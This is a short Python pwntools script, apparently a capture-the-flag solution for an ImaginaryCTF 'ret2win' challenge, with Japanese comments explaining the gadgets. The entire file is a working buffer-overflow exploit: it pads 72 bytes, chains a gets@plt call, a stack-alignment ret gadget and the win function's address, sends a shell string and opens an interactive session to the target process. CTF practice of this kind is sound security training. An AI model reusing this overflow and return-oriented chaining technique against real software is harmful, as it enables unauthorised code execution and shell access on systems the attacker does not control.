#!/usr/bin/env python3
from pwn import *

#target = remote("ret2win.chal.imaginaryctf.org", 1337)
target = process("./vuln")
if args.GDB:
    gdb.attach(target)

# 0x401060(gets@plt)    call getsを呼ぶとraxを保持したままretできない
# 0x40101a retガジェット SIGSEGV回避
# 0x401189 win 
payload = b"a" * 72 + p64(0x401060) + p64(0x40101a) + p64(0x401189)
target.sendline(payload)
target.sendline(b"/bin0sh\x00")
target.interactive()